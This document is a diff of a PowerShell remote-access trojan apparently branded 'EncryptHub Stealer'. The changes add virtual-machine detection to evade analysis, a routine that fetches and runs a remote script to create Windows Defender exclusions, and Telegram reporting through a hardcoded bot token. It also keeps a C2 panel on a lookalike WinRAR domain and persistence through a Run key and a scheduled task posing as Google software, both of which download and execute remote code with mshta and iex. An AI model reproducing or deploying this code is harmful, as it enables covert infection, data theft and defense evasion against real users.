@@ -1,23 +1,90 @@
-#╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
-#║          _____                             _   _   _       _       ____  _             _                      ║
-#║         | ____|_ __   ___ _ __ _   _ _ __ | |_| | | |_   _| |__   / ___|| |_ ___  __ _| | ___ _ __            ║
-#║         |  _| | '_ \ / __| '__| | | | '_ \| __| |_| | | | | '_ \  \___ \| __/ _ \/ _` | |/ _ \ '__|           ║
-#║         | |___| | | | (__| |  | |_| | |_) | |_|  _  | |_| | |_) |  ___) | ||  __/ (_| | |  __/ |              ║
-#║         |_____|_| |_|\___|_|   \__, | .__/ \__|_| |_|\__,_|_.__/  |____/ \__\___|\__,_|_|\___|_|              ║
-#║                                |___/|_|                                                                       ║
-#║                                                                                                               ║
-#║                                    Red Teaming and Offensive Security                                         ║
-#╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
-#
-#╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
-#║						   NO ERRORS                                                     ║
-#╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+#-------------------------
+$debug = $false #Debug mode
+#-------------------------
+$decodedArt = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("IC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnwgICAgICAgICAgX19fX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgIF8gICBfICAgXyAgICAgICBfICAgICAgIF9fX18gIF8gICAgICAgICAgICAgXyAgICAgICAgICAgICAJICAgICAJIHwNCnwgICAgICAgICB8IF9fX198XyBfXyAgIF9fXyBfIF9fIF8gICBfIF8gX18gfCB8X3wgfCB8IHxfICAgX3wgfF9fICAgLyBfX198fCB8XyBfX18gIF9fIF98IHwgX19fIF8gX18gICAgICAgICAgICAgfA0KfCAgICAgICAgIHwgIF98IHwgJ18gXCAvIF9ffCAnX198IHwgfCB8ICdfIFx8IF9ffCB8X3wgfCB8IHwgfCAnXyBcICBcX19fIFx8IF9fLyBfIFwvIF8nIHwgfC8gXyBcICdfX3wgICAgICAgICAgICB8DQp8ICAgICAgICAgfCB8X19ffCB8IHwgfCAoX198IHwgIHwgfF98IHwgfF8pIHwgfF98ICBfICB8IHxffCB8IHxfKSB8ICBfX18pIHwgfHwgIF9fLyAoX3wgfCB8ICBfXy8gfCAgICAgICAgICAgICAgIHwNCnwgICAgICAgICB8X19fX198X3wgfF98XF9fX3xffCAgIFxfXywgfCAuX18vIFxfX3xffCB8X3xcX18sX3xfLl9fLyAgfF9fX18vIFxfX1xfX198XF9fLF98X3xcX19ffF98ICAgICAgICAgICAgICAgfA0KfCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfF9fXy98X3wgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8DQp8ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwNCnwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZWQgVGVhbWluZyBhbmQgT2ZmZW5zaXZlIFNlY3VyaXR5ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfA0KIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0="))
+if ($debug){
+	Write-Host $decodedArt -ForegroundColor Red
+}
+
 $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference = 'SilentlyContinue'
 $redExclamation = [char]0x203C
-#╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
-#║						   TG MESSAGE                                                    ║
-#╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+
+$virtualBiosSignatures = @(
+    "VMware",
+	"HOXKO3",
+    "VMW",
+    "Microsoft",
+    "Unknown",
+    "VGA",
+    "Development",
+    "Bochs",
+    "VirtualBox",
+    "Standard VGA",
+    "Xen",
+    "QEMU",
+    "Microsoft Corporation",
+    "Parallels",
+    "innotek GmbH",
+    "KVM",
+    "HVM domU",
+    "0.0.0",
+    "Oracle Corporation"
+)
+$biosInfo = Get-WmiObject -Class Win32_BIOS
+foreach ($bios in $biosInfo) {
+    $biosName = $bios.Name
+    $biosManufacturer = $bios.Manufacturer
+    $biosVersion = $bios.SMBIOSBIOSVersion
+    Write-Output "Checking BIOS: $biosName, Manufacturer: $biosManufacturer, Version: $biosVersion"
+    foreach ($signature in $virtualBiosSignatures) {
+        if ($biosName -like "*$signature*" -or $biosManufacturer -like "*$signature*" -or $biosVersion -like "*$signature*") {
+			# MSG
+			if ($debug){
+				Write-Host "[RAT] VM DETECTED BIOS: $biosName" -ForegroundColor Red
+			}
+			$message = " $($redExclamation) [RAT] VM DETECTED BIOS: $biosName"
+			Send-TelegramMessage -message $message
+			Remove-Item -Path $lockFilePath
+			exit
+        }
+    }
+}
+$gpuInfo = Get-WmiObject -Query "Select * from Win32_VideoController"
+foreach ($gpu in $gpuInfo) {
+	foreach ($signature in $virtualBiosSignatures) {
+        if ($gpu.Name -like "*$signature*") {
+			# MSG
+			if ($debug){
+				Write-Host "[RAT] VM DETECTED BIOS: $biosName" -ForegroundColor Red
+			}
+			$message = "$($redExclamation) [RAT] VM DETECTED GPU: $gpu.Name"
+			Send-TelegramMessage -message $message
+			Remove-Item -Path $lockFilePath
+			exit
+        }
+    }
+}
+
+# Exclusion by Google
+function Invoke-Shield {
+    param (
+        [string]$filepath
+    )
+    $scriptContent = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/sap3r-encrypthub/encrypthub/main/exclusions/defender-exclusions.ps1"
+    $path = $filepath
+    $tempScriptPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetRandomFileName() + ".ps1")
+    Set-Content -Path $tempScriptPath -Value $scriptContent
+    $arguments = "-ExecutionPolicy Bypass -File `"$tempScriptPath`" `"$path`""
+	Write-Output "[*] Starting Protector" -ForegroundColor Green
+    Start-Process -FilePath "powershell.exe" -ArgumentList $arguments -WindowStyle Hidden -Wait
+    Remove-Item -Path $tempScriptPath
+	Write-Output "[*] Protected $path"  -ForegroundColor Green
+}
+#--------------------
+$scriptDirectory = Split-Path -Path $MyInvocation.MyCommand.Definition -Parent
+Invoke-Shield -filepath $scriptDirectory
+#--------------------
 function Send-TelegramMessage {
     param (
         [string]$message
@@ -26,13 +93,13 @@ function Send-TelegramMessage {
     $ErrorActionPreference = 'silentlycontinue'
     $Messaging = $message
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
+	#Check Active Directory
     $compSystem = Get-WmiObject -Class Win32_ComputerSystem
     $domain = $null
     if ($compSystem.PartOfDomain) {
         $domain = "$($compSystem.Domain)"
     } else {
-        Write-Output "Domain not found"
+        Write-Output "[!] Domain not found" -ForegroundColor Red
     }
 
     $botToken = "7484009227:AAEvngzrIKFNFdfSqECzWAqbnB5IXk8pjVo" 
@@ -71,7 +138,7 @@ function Send-TelegramMessage {
                 try {
                     Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -ContentType "application/json" -Body $utf8JsonParams
                 } catch {
-                    Write-Output "Restricted"
+                    Write-Output "[!] Restricted: $adminId" -ForegroundColor Red
                 }
             }
         } else {
@@ -89,11 +156,8 @@ function Send-TelegramMessage {
         }
     }
 }
-#╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
-#║						      MAIN                                                       ║
-#╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
 
-$SERVER_URL = "https://www.win-rar.co/panel/"
+$SERVER_URL = "https://www.win-rar.co/panel/"# Panel
 
 $message = "$($redExclamation) [RAT] Installed"
 Send-TelegramMessage -message $message
@@ -102,9 +166,7 @@ $UAG='Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML,
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls12, [Net.SecurityProtocolType]::Ssl3
 
 Add-Type -AssemblyName PresentationCore, PresentationFramework, System.Net.Http, System.Windows.Forms, System.Drawing
-#╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
-#║						     SYSTEM                                                      ║
-#╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+
 function SystemInfo {
     $IP = Invoke-RestMethod https://ident.me -UserAgent $UAG
     $UID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
@@ -116,9 +178,7 @@ function SystemInfo {
     }
     return $SYSTEM 
 }
-#╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
-#║						     CRYPT                                                       ║
-#╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+
 function EncryptString {
     Param ([string]$inputStr)
     $inputBytes = [System.Text.Encoding]::UTF8.GetBytes($inputStr)
@@ -152,17 +212,15 @@ function DcryptString {
     return $RESULTStr
     $dec.Dispose()
 }
-#╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
-#║						    CRITICAL                                                     ║
-#╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+
 function KDMUTEX {
-    if ($fakeerror) {
-        [Windows.Forms.MessageBox]::Show("The program can't start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.", '', 'OK', 'Error')
-    }
     $AppId = "62088a7b-ae9f-4802-827a-6e9c666cb48e" #GUID
     $CreatedNew = $false
     $script:SingleInstanceEvent = New-Object Threading.EventWaitHandle $true, ([Threading.EventResetMode]::ManualReset), "Global\$AppID", ([ref] $CreatedNew)
     if (-not $CreatedNew) {
+		if ($debug){
+			Write-Output "[!] An instance of this script is already running."  -ForegroundColor Red
+		}
 		$message = "[RAT] [!] An instance of this script is already running."
 		Send-TelegramMessage -message $message
         exit
@@ -193,22 +251,26 @@ public static class ProcessUtility
     }
 }
 "@
-#╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
-#║						      MAIN                                                       ║
-#╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+
 function Invoke-TASKS {
 	if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
 		$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 		$regName = "Google LLC Worker"
-		$regValue = "mshta.exe vbscript:createobject(`"wscript.shell`").run(`"powershell `$t = Iwr -Uri 'https://github.com/encrypthub/steal/raw/main/zakrep/invoker.ps1'|iex`",0)(window.close)"
+		$regValue = "mshta.exe vbscript:createobject(`"wscript.shell`").run(`"powershell `$t = Iwr -Uri 'https://raw.githubusercontent.com/sap3r-encrypthub/encrypthub/main/zakrep/worker.ps1'|iex`",0)(window.close)"
 
 		New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null
 
 		$property = Get-ItemProperty -Path $regPath -Name $regName
 		if ($property.$regName -eq $regValue) {
+			if ($debug){
+				Write-Output "[+] Reg AutoRun success."  -ForegroundColor Green
+			}
 			$message = "$($redExclamation) [RAT] REG AutoRun success"
 			Send-TelegramMessage -message $message
 		} else {
+			if ($debug){
+				Write-Output "[!] Reg AutoRun fail"  -ForegroundColor Red
+			}
 			$message = "$($redExclamation) [RAT] REG AutoRun fail"
 			Send-TelegramMessage -message $message
 		}
@@ -218,14 +280,20 @@ function Invoke-TASKS {
 		if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
 			Unregister-ScheduledTask -TaskName $backName -Confirm:$false
 		}
-		$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$t = Iwr -Uri 'https://github.com/encrypthub/steal/raw/main/zakrep/invoker.ps1'|iex`",0)(window.close)"
+		$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$t = Iwr -Uri 'https://raw.githubusercontent.com/sap3r-encrypthub/encrypthub/main/zakrep/worker.ps1'|iex`",0)(window.close)"
 		$task_trigger = New-ScheduledTaskTrigger -AtLogOn
 		$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
 		Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $backName -Description "Google Chrome Protector" -RunLevel Highest -Force | Out-Null
 		if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
+			if ($debug){
+				Write-Output "[+] Task AutoRun success"  -ForegroundColor Green
+			}
 			$message = "$($redExclamation) [RAT] TASK AutoRun success"
 			Send-TelegramMessage -message $message
 		} else {
+			if ($debug){
+				Write-Output "[!] Task AuoRun fail"  -ForegroundColor Red
+			}
 			$message = "$($redExclamation) [RAT] TASK AutoRun fail"
 			Send-TelegramMessage -message $message
 		}
@@ -289,22 +357,3 @@ function Invoke-TASKS {
 	}
 }
 KDMUTEX
-#╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
-#║						      NOTES                                                      ║
-#╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
-#╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
-#║														 ║
-#║Disclaimer:													 ║
-#║This script is provided "as is" without warranty of any kind, either express or implied, including but not 	 ║
-#║limited to the implied warranties of merchantability and fitness for a particular purpose. The entire risk as  ║
-#║to the quality and performance of the script is with you. Should the script prove defective, you assume the    ║
-#║cost of all necessary servicing, repair, or correction.							 ║
-#║														 ║
-#║Use this script at your own risk. The author or distributor is not responsible for any damage or loss, 	 ║ 																										
-#║including but not limited to loss of data, business interruption, or personal injury, arising from the use or  ║
-#║inability to use this script.											 ║
-#║														 ║
-#║By using this script, you agree to these terms and conditions. If you do not agree to these terms, do not use  ║ 
-#║this script.													 ║
-#║														 ║
-#╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
